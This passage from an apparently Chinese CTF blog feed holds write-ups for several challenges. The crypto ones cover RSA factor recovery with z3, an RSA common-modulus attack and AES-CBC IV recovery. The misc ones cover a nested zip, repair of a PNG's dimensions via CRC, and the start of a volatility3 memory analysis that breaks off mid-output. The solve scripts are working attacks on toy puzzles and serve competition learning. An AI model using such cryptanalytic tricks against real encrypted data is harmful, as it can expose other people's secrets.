<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Derivative</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">z=Fraction(<span class="number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="number">1</span>,Derivative(arth(q),q))</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c,z,n)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>其中输出的值为从上到下依次为c,z,n</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line"><span class="string">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line"><span class="string">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>给了z和n与pq的关系</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">z=Fraction(<span class="number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="number">1</span>,Derivative(arth(q),q))</span><br><span class="line"><span class="comment">#Derivative用于求导，此处artan的倒数为1/(1+x^2) arth实际是反双曲正切函数artanhx倒数为1/(1-x^2)</span></span><br><span class="line"><span class="comment">#Fraction用于求分数第一个参数是分子，第二个参数是分母</span></span><br><span class="line"><span class="comment">#所以z=p^2+q^2</span></span><br></pre></td></tr></table></figure></div>

<p>直接通过z3求解器可求 exp:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from z3 import*</span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from sympy import Derivative</span><br><span class="line">from fractions import Fraction</span><br><span class="line"># from secret import flag</span><br><span class="line"></span><br><span class="line"># p=getPrime(1024)</span><br><span class="line"># q=getPrime(1024)</span><br><span class="line">e=65537</span><br><span class="line"># n=p*q</span><br><span class="line"># z=Fraction(1,Derivative(atan(p),p))-Fraction(1,Derivative(atanh(q),q))</span><br><span class="line"># m=bytes_to_long(flag)</span><br><span class="line"># c=pow(m,e,n)</span><br><span class="line"># print(c,z,n)</span><br><span class="line">c=7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span><br><span class="line">z=32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span><br><span class="line">n=15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span><br><span class="line">p,q=Int(&#x27;p&#x27;),Int(&#x27;q&#x27;)</span><br><span class="line">f=Solver()</span><br><span class="line">nz=pow(p,2)+pow(q,2)</span><br><span class="line">f.add(nz==z,p*q==n)</span><br><span class="line">while f.check()==sat:</span><br><span class="line">	tmp=f.model()</span><br><span class="line">	np,nq=int(str(tmp[p])),int(str(tmp[q]))</span><br><span class="line">	d=gmpy2.invert(e,(np-1)*(nq-1))</span><br><span class="line">	m=pow(c,d,n)</span><br><span class="line">	print(long_to_bytes(m))</span><br><span class="line">	f.add(p!=np,q!=nq)</span><br><span class="line">	</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>SWPU 2020happy  NSSCTF</title>
    <url>/2023/06/30/CTF%20WP/Crypto/SWPU%202020happy%20%20NSSCTF/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://www.nssctf.cn/problem/149" >SWPU 2020]happy | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;c=&#x27;, &#x27;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL&#x27;)</span><br><span class="line">(&#x27;e=&#x27;, &#x27;0x872a335&#x27;)</span><br><span class="line">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span><br><span class="line">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span><br></pre></td></tr></table></figure></div>

<p>给了c和e</p>
<p>还有p，q之间的关系</p>
<p>p和q可以通过z3暴力求</p>
<p>根据公式</p>
<p>m&#x3D;c^d(mod p*q)</p>
<p>d为e关于mod((p-1)*(q-1))的逆元</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span></span><br><span class="line">e=<span class="number">0x872a335</span></span><br><span class="line">f=Solver()</span><br><span class="line">p,q=Int(<span class="string">&#x27;p&#x27;</span>),Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">f.add(q + q*<span class="built_in">pow</span>(p,<span class="number">3</span>) ==<span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span>,</span><br><span class="line">q*p + q *<span class="built_in">pow</span>(p,<span class="number">2</span>) == <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span>)</span><br><span class="line"><span class="keyword">while</span> f.check()==sat:</span><br><span class="line">	m=f.model()</span><br><span class="line">	<span class="built_in">print</span>(m[p])</span><br><span class="line">	<span class="built_in">print</span>(m[q])</span><br><span class="line">	np=<span class="built_in">int</span>(<span class="built_in">str</span>(m[p]))</span><br><span class="line">	nq=<span class="built_in">int</span>(<span class="built_in">str</span>(m[q]))</span><br><span class="line">	f.add(p!=np,q!=nq)</span><br><span class="line">	m=<span class="built_in">pow</span>(c,gmpy2.invert(e,(np-<span class="number">1</span>)*(nq-<span class="number">1</span>)),np*nq)</span><br><span class="line"><span class="comment">#gmpy2.invert用于求e关于mod phi(n)的逆元 d</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">		<span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>安洵杯 2020easyaes</title>
    <url>/2023/07/17/CTF%20WP/Crypto/%E5%AE%89%E6%B4%B5%E6%9D%AF%202020easyaes/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> key</span><br><span class="line"></span><br><span class="line">iv = flag.strip(<span class="string">b&#x27;d0g3&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">LENGTH = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="keyword">assert</span> LENGTH == <span class="number">16</span></span><br><span class="line"></span><br><span class="line">hint = os.urandom(<span class="number">4</span>) * <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;Welcome to this competition, I hope you can have fun today!!!!!!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypto</span>(<span class="params">message</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encrypto(msg))[-<span class="number">32</span>:])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">56631233292325412205528754798133970783633216936302049893130220461139160682777</span></span><br><span class="line"><span class="string">b&#x27;3c976c92aff4095a23e885b195077b66&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这道题涉及AES的ECB加密</p>
<p>因为hint是4字节重复8次，共32字节，而key只有16字节，异或后只有后16字节改变了可以通过前16字节获取hint，再异或回去就可以获得key了</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">hint=<span class="string">&#x27;&#123;:&lt;4X&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="number">56631233292325412205528754798133970783633216936302049893130220461139160682777</span>)[:<span class="number">4</span>*<span class="number">2</span>]*<span class="number">8</span></span><br><span class="line">key=long_to_bytes(a^<span class="built_in">int</span>(hint,<span class="number">16</span>))</span><br></pre></td></tr></table></figure></div>

<p>根据这题，我们需要获取iv，根据CBC模式和ECB模式的转化可以获取</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">m=<span class="string">b&#x27;xxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyy&#x27;</span></span><br><span class="line">key=<span class="string">b&#x27;aEs_1s_SO0o_e4sY&#x27;</span></span><br><span class="line">iv=<span class="string">b&#x27;D0g3D0g3D0g3D0g3&#x27;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc=aes.encrypt(m)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure></div>

<p>其等效于ECB模式的，第一步第一组明文异或初始向量，第二部第二组明文异或上一次的加密结果，以此类推</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">m1=<span class="string">b&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">m2=<span class="string">b&#x27;yyyyyyyyyyyyyyyy&#x27;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">enc1=aes.encrypt(strxor(m1,iv))</span><br><span class="line">enc2=aes.encrypt(strxor(m2,enc1))</span><br><span class="line">enc=enc1+enc2</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure></div>

<p>此处msg有64字节，所以有4组，等效于ECB模式的</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">msg = <span class="string">b&#x27;Welcome to this competition, I hope you can have fun today!!!!!!&#x27;</span></span><br><span class="line">m1=msg[:<span class="number">16</span>]</span><br><span class="line">m2=msg[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">m3=msg[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line">m4=msg[<span class="number">48</span>:]</span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">enc1=aes.encrypt(strxor(m1,iv))</span><br><span class="line">enc2=aes.encrypt(strxor(m2,enc1))</span><br><span class="line">enc3=aes.encrypt(strxor(m3,enc2))</span><br><span class="line">enc4=aes.encrypt(strxor(m4,enc3))</span><br><span class="line">enc=enc1+enc2+enc3+enc4</span><br></pre></td></tr></table></figure></div>

<p>那我们可以直接从enc4递推回iv</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">msg = <span class="string">b&#x27;Welcome to this competition, I hope you can have fun today!!!!!!&#x27;</span></span><br><span class="line">m1=msg[:<span class="number">16</span>]</span><br><span class="line">m2=msg[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">m3=msg[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line">m4=msg[<span class="number">48</span>:]</span><br><span class="line">enc4=<span class="string">b&#x27;3c976c92aff4095a23e885b195077b66&#x27;</span></span><br><span class="line">enc4=long_to_bytes(<span class="built_in">int</span>(enc4,<span class="number">16</span>))<span class="comment">#从16进制字符串转化回原字符串</span></span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">enc3=strxor(aes.decrypt(enc4),m4)</span><br><span class="line">enc2=strxor(aes.decrypt(enc3),m3)</span><br><span class="line">enc1=strxor(aes.decrypt(enc2),m2)</span><br><span class="line">iv=strxor(aes.decrypt(enc1),m1)</span><br></pre></td></tr></table></figure></div>

<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line">msg = <span class="string">b&#x27;Welcome to this competition, I hope you can have fun today!!!!!!&#x27;</span></span><br><span class="line">a=<span class="number">56631233292325412205528754798133970783633216936302049893130220461139160682777</span></span><br><span class="line">enc4=<span class="string">b&#x27;3c976c92aff4095a23e885b195077b66&#x27;</span></span><br><span class="line">enc4=long_to_bytes(<span class="built_in">int</span>(enc4,<span class="number">16</span>))</span><br><span class="line">msgs=[bytes_to_long(msg[i:i+<span class="number">16</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(msg),<span class="number">16</span>)]</span><br><span class="line">hint=<span class="string">&#x27;&#123;:&lt;4X&#125;&#x27;</span>.<span class="built_in">format</span>(a)[:<span class="number">4</span>*<span class="number">2</span>]*<span class="number">8</span></span><br><span class="line">key=long_to_bytes(a^<span class="built_in">int</span>(hint,<span class="number">16</span>))</span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">enc=[<span class="number">0</span>]*<span class="number">5</span></span><br><span class="line">enc[<span class="number">4</span>]=enc4</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">	enc[i]=long_to_bytes(bytes_to_long(aes.decrypt(enc[i+<span class="number">1</span>]))^msgs[i])</span><br><span class="line"><span class="built_in">print</span>(enc[<span class="number">0</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>SWPUCTF 2021 新生赛crypto1</title>
    <url>/2023/07/09/CTF%20WP/Crypto/SWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9Bcrypto1/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://www.nssctf.cn/problem/412" >SWPUCTF 2021 新生赛]crypto1 | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>题干</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag  = <span class="string">&#x27;****************************&#x27;</span></span><br><span class="line">flag = &#123;<span class="string">&quot;asfajgfbiagbwe&quot;</span>&#125;</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">e1e2 = <span class="number">3087</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br></pre></td></tr></table></figure></div>

<p>给了flag1和flag2，两个都i是对m加密对n取余，符合共模攻击的条件，同时e1e2满足条件e1e2&#x3D;3087</p>
<p>可以通过遍历所有值暴力求解，对结果进行限制</p>
<p>exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag1= </span><br><span class="line">flag2= </span><br><span class="line">n= </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gongmogongji</span>(<span class="params">c1, c2, e1, e2,n</span>):</span><br><span class="line">	<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">	<span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext,iroot</span><br><span class="line">	gcd,x,y=gcdext(e1,e2)</span><br><span class="line">	m=iroot((<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n))%n,gcd)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">return</span> long_to_bytes(m) <span class="keyword">if</span> long_to_bytes(m)[:<span class="number">6</span>]==<span class="string">b&#x27;NSSCTF&#x27;</span><span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3087</span>):</span><br><span class="line">	<span class="keyword">if</span>(<span class="number">3087</span>%i==<span class="number">0</span>):</span><br><span class="line">		j=<span class="number">3087</span>//i</span><br><span class="line">		<span class="built_in">print</span>(gongmogongji(flag1,flag2,i,j,n),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307092345814.png"
                      alt="image-20230709234504777"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>SCTF2023 checkin</title>
    <url>/2023/06/23/CTF%20WP/Misc/SCTF2023%20checkin/</url>
    <content><![CDATA[<p>点击通过资源管理器打开</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230140213.png"
                      alt="image-20230623014043149"
                ></p>
<p>点击全部解压缩</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230133029.png"
                      alt="image-20230623013317976"
                ></p>
<p>会出现一个重名的文件，直接跳过</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230133086.png"
                      alt="image-20230623013345054"
                ></p>
<p>直接跳过，查看那个文件就会有flag了，具体原因猜测是原zip中放了个压缩后的压缩包，无法被正常识别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230134086.png"
                      alt="image-20230623013445052"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>好看的维吾尔族小姐姐</title>
    <url>/2023/05/20/CTF%20WP/Misc/%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%BB%B4%E5%90%BE%E5%B0%94%E6%97%8F%E5%B0%8F%E5%A7%90%E5%A7%90/</url>
    <content><![CDATA[<p>观测前缀为PNG开头，为png文件直接改后缀为png即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20230520162424364.png"
                      alt="image-20230520162424364"
                ></p>
<p>通过脚本运算其正常的长宽，其宽度被修改了，改回去即可，如下图所示</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20230520162858203.png"
                      alt="image-20230520162858203"  
                >

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;E:\\EDGE下载\\attachment-1 (2)\\古力娜扎.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#打开图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0x52084BFB</span>):    <span class="comment">#图片当前CRC</span></span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure></div>

<p>图片变为了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20230520163007285.png"
                      alt="image-20230520163007285"
                ></p>
<p>观察二维码形状，类似于Data Matrix码，但是经过了镜像(原本我以为是拼图一类的，卡了很久)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20230520163026034.png"
                     
                ></p>
<p>直接进行镜像即可(镜像就是题目所指的维吾尔族的说话方式,不知道为啥，应该是写字方式才对吧)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20230520163241541.png"
                      alt="image-20230520163241541"
                ></p>
<p>扫码后的结果是</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;521#&amp;;33#&amp;;101#&amp;;011#&amp;;111#&amp;;001#&amp;;801#&amp;;801#&amp;;101#&amp;;911#&amp;;59#&amp;;611#&amp;;501#&amp;;59#&amp;;611#&amp;;111#&amp;;301#&amp;;59#&amp;;711#&amp;;111#&amp;;121#&amp;;321#&amp;;76#&amp;;76#&amp;;38#&amp;;37#&amp;</span><br></pre></td></tr></table></figure></div>

<p>也是html字符编码的镜像，从后往前读便可如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#73;&amp;#83;&amp;#67;&amp;#67;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#95;&amp;#103;&amp;#111;&amp;#116;&amp;#95;&amp;#105;&amp;#116;&amp;#95;&amp;#119;&amp;#101;&amp;#108;&amp;#108;&amp;#100;&amp;#111;&amp;#110;&amp;#101;&amp;#33;&amp;#125;</span><br></pre></td></tr></table></figure></div>

<p>![](<a class="link"   href="https://i.ibb.co/BwDpzSS/UL-OK-QRS8-OJTIROI-M.png" >https://i.ibb.co/BwDpzSS/UL-OK-QRS8-OJTIROI-M.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;400x300)</p>
<p>ISCC{you_got_it_welldone!}<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/Desktop/UL-OK-QRS8-OJTIROI-M.png"
                      alt="UL-OK-QRS8-OJTIROI-M"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>巅峰极客 2022easy_Forensic</title>
    <url>/2023/07/23/CTF%20WP/Misc/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%202022easy_Forensic/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://www.nssctf.cn/problem/2506" >巅峰极客 2022]easy_Forensic | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><del>只是个初学vol3的小草稿</del></p>
<p>附件是个raw文件(不是图片，相当于一个内存镜像)</p>
<p>使用volatility3进行分析</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vol -f secret.raw windows.info</span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">Variable        Value</span><br><span class="line"></span><br><span class="line">Kernel Base     0xf80003e06000</span><br><span class="line">DTB     0x187000</span><br><span class="line">Symbols file:///home/wrwrw/.local/lib/python3.11/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/F8E2A8B5C9B74BF4A6E4A48F18009994-2.json.xz</span><br><span class="line">Is64Bit True</span><br><span class="line">IsPAE   False</span><br><span class="line">layer_name      0 WindowsIntel32e</span><br><span class="line">memory_layer    1 FileLayer</span><br><span class="line">KdDebuggerDataBlock     0xf80003fef070</span><br><span class="line">NTBuildLab      7600.16385.amd64fre.win7_rtm.090</span><br><span class="line">CSDVersion      0</span><br><span class="line">KdVersionBlock  0xf80003fef030</span><br><span class="line">Major/Minor     15.7600</span><br><span class="line">MachineType     34404</span><br><span class="line">KeNumberProcessors      1</span><br><span class="line">SystemTime      2022-08-13 11:48:11</span><br><span class="line">NtSystemRoot    